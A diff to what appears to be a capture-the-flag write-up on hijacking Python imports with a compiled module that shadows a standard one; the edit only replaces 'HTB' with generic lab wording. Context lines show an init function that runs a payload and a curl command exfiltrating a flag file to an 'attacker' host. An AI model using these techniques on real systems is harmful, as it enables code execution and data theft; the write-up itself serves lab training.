@@ -64,7 +64,7 @@ PyMODINIT_FUNC PyInit_subprocess(void){ payload(); return PyModule_Create(&md); 
 
 > The exported init symbol **must** match `PyInit_<modname>` — if you shadow `ssl`, name the function `PyInit_ssl`. Otherwise Python raises `ImportError: dynamic module does not define module export function`.
 
-## Cross-compile recipe (HTB / most CTF challenges = `linux/amd64`)
+## Cross-compile recipe (lab platforms / most CTF challenges = `linux/amd64`)
 
 Your dev host is usually arm64 (Apple Silicon). Use Docker to build the matching arch:
 
@@ -148,4 +148,4 @@ import os; os.system('curl http://attacker/$(cat /app/flag.txt|base64 -w0)')
 
 ## Real-world reference
 
-- HTB **Resizer** (Web, Hard, 2026-04-17) — exact chain documented above. `Pillow 10.2.0` + `gunicorn 5 workers` + `if '.py' in filename` blacklist.
+- Lab challenge **Resizer** (Web, Hard, 2026-04-17) — exact chain documented above. `Pillow 10.2.0` + `gunicorn 5 workers` + `if '.py' in filename` blacklist.
